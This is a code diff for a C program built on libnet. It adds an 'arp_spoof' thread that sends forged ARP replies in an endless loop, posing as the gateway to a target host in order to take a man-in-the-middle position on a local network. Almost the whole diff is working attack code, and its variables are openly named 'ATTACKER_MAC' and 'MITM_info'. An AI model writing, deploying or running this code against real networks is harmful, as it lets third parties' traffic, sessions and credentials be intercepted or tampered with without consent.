@@ -1,5 +1,5 @@
 #include "arp.h"
-
+extern bool debug;
 int send_fake_ARP(char* dev, u_char* srcMac, u_char* destMac, u_char* srcIp, u_char* destIp,int op){
 	libnet_t *net_t = NULL;
 	static u_char padPtr[18];
@@ -43,4 +43,27 @@ int send_fake_ARP(char* dev, u_char* srcMac, u_char* destMac, u_char* srcIp, u_c
 	/* success */
         libnet_destroy(net_t);
         return p_tag;	
+}
+void* arp_spoof(void* info){
+	MITM_info* m_info=(MITM_info*)info;
+	if(debug){
+		printf("=======start arp spoof=======\n");
+		printf("dev is %s\n",m_info->dev);
+		printf("target's IP is ");
+		print_ip(m_info->TARGET_IP);	
+	}
+	int p_tag_target;
+	p_tag_target=send_fake_ARP(m_info->dev,m_info->ATTACKER_MAC,
+				m_info->TARGET_MAC,m_info->GATEWAY_IP,m_info->TARGET_IP,0);
+	if(p_tag_target == -1){
+		if(debug) printf("=======arp spoof fail,return=======\n");
+		return NULL;
+	}
+	while(1){
+		p_tag_target=send_fake_ARP(m_info->dev,m_info->ATTACKER_MAC,m_info->TARGET_MAC,
+				m_info->GATEWAY_IP,m_info->TARGET_IP,p_tag_target);
+		if(p_tag_target == -1)break;
+	}
+	printf("=======arp spoof fail,return=======\n");
+	return NULL;
 }
